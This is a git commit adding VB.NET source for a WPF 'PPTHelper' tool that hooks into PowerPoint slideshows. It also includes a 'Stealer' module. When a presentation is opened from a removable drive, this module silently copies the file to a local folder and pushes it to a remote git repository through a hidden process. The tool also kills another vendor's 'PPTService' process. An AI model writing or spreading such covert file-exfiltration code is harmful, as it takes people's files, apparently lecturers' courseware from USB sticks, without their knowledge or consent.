bb64d423ec25614bf5665dc730987d3c038f061e
szy <1357310795@qq.com>
2021-04-29 15:17:41 +0800

    添加项目文件。

---
+++ TelerikWpfApp1/Application.xaml.vb
@@ -0,0 +1,119 @@
+﻿Imports System.IO
+Imports System.Reflection
+Imports System.Threading.Tasks
+Imports System.Timers
+Imports System.Windows.Interop
+Imports Microsoft.Office.Interop
+Imports TelerikWpfApp1.logcat.Log
+
+Class Application
+    Inherits System.Windows.Application
+    Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
+    Private Declare Function IsWindow Lib "user32" Alias "IsWindow" (ByVal hwnd As Int32) As Int32
+    Private Declare Function GetWindowRect Lib "user32" Alias "GetWindowRect" (ByVal hwnd As IntPtr, ByRef lpRect As RECT) As Integer
+    Private Declare Function GetClientRect Lib "user32" Alias "GetClientRect" (ByVal hwnd As IntPtr, ByRef lpRect As RECT) As Integer
+    Private Declare Function MoveWindow Lib "user32" Alias "MoveWindow" (ByVal hwnd As IntPtr,
+                                                                         ByVal x As Integer,
+                                                                         ByVal y As Integer,
+                                                                         ByVal nWidth As Integer,
+                                                                         ByVal nHeight As Integer,
+                                                                         ByVal bRepaint As Boolean) As Integer
+    Private Declare Function SetForegroundWindow Lib "user32" Alias "SetForegroundWindow" (ByVal hwnd As Int32) As Int32
+    Private Declare Function SetProcessDPIAware Lib "user32" Alias "SetProcessDPIAware" () As Boolean
+    Private mutex As System.Threading.Mutex
+    Public mw As MainWindow1
+    Dim prepare_timer As System.Windows.Threading.DispatcherTimer
+    Dim close_timer As Timer
+    Dim ppt_hwnd As Int32
+
+    Protected Overrides Sub OnExit(e As ExitEventArgs)
+        logcat.Log.Logger.Instance.WriteLog(e.ApplicationExitCode.ToString)
+        MyBase.OnExit(e)
+    End Sub
+
+    Protected Overrides Sub OnSessionEnding(e As SessionEndingCancelEventArgs)
+        logcat.Log.Logger.Instance.WriteLog(e.ReasonSessionEnding.ToString)
+        MyBase.OnSessionEnding(e)
+    End Sub
+
+    Protected Overrides Sub OnStartup(ByVal e As StartupEventArgs)
+        logcat.Log.Logger.Instance.WriteLog("程序启动")
+        MyBase.OnStartup(e)
+        Dim ret As Boolean
+        mutex = New System.Threading.Mutex(True, "PPTHelper", ret)
+
+        If Not ret Then
+            Environment.[Exit](0)
+        End If
+        AddHandler DispatcherUnhandledException, AddressOf App_DispatcherUnhandledException
+
+        prepare_timer = New System.Windows.Threading.DispatcherTimer
+        prepare_timer.Interval = TimeSpan.FromSeconds(1)
+        close_timer = New Timer
+        close_timer.Interval = 200
+        AddHandler prepare_timer.Tick, AddressOf prepare
+        AddHandler close_timer.Elapsed, AddressOf close
+        prepare_timer.Start()
+    End Sub
+
+    Private Sub prepare()
+        'ppt_hwnd = FindWindow("PPTFrameClass", vbNullString)
+        ppt_hwnd = FindWindow("screenClass", vbNullString)
+        If ppt_hwnd <> 0 Then
+            prepare_timer.Stop()
+            Try
+                mw = New MainWindow1()
+                mw.ppt_hwnd = ppt_hwnd
+                GetWindowRect(ppt_hwnd, mw.ppt_rect)
+                mw.ppt_obj = New PowerPoint.Application
+                mw.ppt_view = mw.ppt_obj.ActivePresentation.SlideShowWindow.View
+                Me.MainWindow = mw
+                MainWindow.Show()
+            Catch ex As Exception
+                logcat.Log.Logger.Instance.WriteException(ex)
+            Finally
+                close_timer.Start()
+                Dim seewo = Process.GetProcessesByName("PPTService")
+                If seewo.Length <> 0 Then
+                    For Each i In seewo
+                        i.Kill()
+                    Next
+                End If
+            End Try
+        End If
+    End Sub
+
+    Private Sub close()
+        If IsWindow(ppt_hwnd) = 0 Then
+            close_timer.Stop()
+            If mw IsNot Nothing Then
+                Me.Dispatcher.Invoke(Sub()
+                                         mw.Close()
+                                         mw = Nothing
+                                         Me.MainWindow = Nothing
+                                         'Application.Current.Shutdown()
+                                     End Sub)
+                'Console.WriteLine("WINDOW_CLOSE")
+            End If
+            FlushMemory.Flush()
+            If updatehelper.updateok Then
+                Dim t1 = New DirectoryInfo(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location))
+                Dim downini = t1.Parent.FullName & "\tmp.ini"
+                Dim localini = t1.Parent.FullName & "\version.ini"
+                Dim rootpath = t1.Parent.FullName
+                Logger.Instance.WriteLog("运行loader")
+                Process.Start(rootpath & "\loader.exe")
+                End
+                Logger.Instance.WriteLog("什么？END之后还能执行？")
+            End If
+            prepare_timer.Start()
+        End If
+
+    End Sub
+
+
+    Private Sub App_DispatcherUnhandledException(ByVal sender As Object, ByVal e As System.Windows.Threading.DispatcherUnhandledExceptionEventArgs)
+        MessageBox.Show("程序异常." & Environment.NewLine + e.Exception.Message)
+        e.Handled = True
+    End Sub
+End Class
---
+++ TelerikWpfApp1/Modules/Stealer.vb
@@ -0,0 +1,63 @@
+﻿Public Class Stealer
+    Public Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Int32
+    Public Const DRIVE_UNKNOWN = 0
+    Public Const DRIVE_NO_ROOT_DIR = 1
+    Public Const DRIVE_REMOVABLE = 2
+    Public Const DRIVE_FIXED = 3
+    Public Const DRIVE_REMOTE = 4
+    Public Const DRIVE_CDROM = 5
+    Public Const DRIVE_RAMDISK = 6
+    Public Shared Sub steal(ppt As String)
+        Try
+            Dim f As Boolean = True
+            Dim tmp As New IO.FileInfo(ppt)
+
+            If GetDriveType(System.IO.Path.GetPathRoot(ppt)) <> DRIVE_REMOVABLE Then
+                f = False
+            End If
+            If f Then
+                Dim new_name As String = tmp.Name.Replace(tmp.Extension, "") + Format(Now(), "_yyyy_MM_dd_HH_mm_ss_ff") + tmp.Extension
+                IO.Directory.CreateDirectory("D:\课件\新建文件夹\" + Format(Now(), "yyyy_MM_dd"))
+                IO.File.Copy(ppt, "D:\课件\新建文件夹\" + Format(Now(), "yyyy_MM_dd") + "\" + new_name)
+            End If
+            Dim git As New CommandRunner("C:\Program Files\Git\cmd\git.exe", "D:\课件\新建文件夹")
+            logcat.Log.Logger.Instance.WriteLog(git.Run("add ."))
+            logcat.Log.Logger.Instance.WriteLog(git.Run("commit -m """ & Format(Now(), "yyyy_MM_dd_HH_mm_ss_ff") & """"))
+            logcat.Log.Logger.Instance.WriteLog(git.Run("push -u origin master"))
+        Catch ex As Exception
+            logcat.Log.Logger.Instance.WriteException(ex)
+        End Try
+    End Sub
+    Public Class CommandRunner
+        Public Shared Property ExecutablePath As String
+        Public Shared Property WorkingDirectory As String
+
+        Public Sub New(ByVal executablePath1 As String, ByVal Optional workingDirectory1 As String = Nothing)
+            ExecutablePath = If(executablePath1, CSharpImpl.__Throw(Of System.String)(New ArgumentNullException(NameOf(executablePath1))))
+            WorkingDirectory = If(workingDirectory1, IO.Path.GetDirectoryName(executablePath1))
+        End Sub
+
+        Public Function Run(ByVal arguments As String) As String
+            Dim info = New ProcessStartInfo() With {
+                .FileName = ExecutablePath,
+                .Arguments = arguments,
+                .CreateNoWindow = True,
+                .RedirectStandardOutput = True,
+                .UseShellExecute = False,
+                .WorkingDirectory = WorkingDirectory
+            }
+            Dim process = New Process With {
+                .StartInfo = info
+            }
+            process.Start()
+            Return process.StandardOutput.ReadToEnd()
+        End Function
+
+        Private Class CSharpImpl
+            <Obsolete("Please refactor calling code to use normal throw statements")>
+            Shared Function __Throw(Of T)(ByVal e As Exception) As T
+                Throw e
+            End Function
+        End Class
+    End Class
+End Class
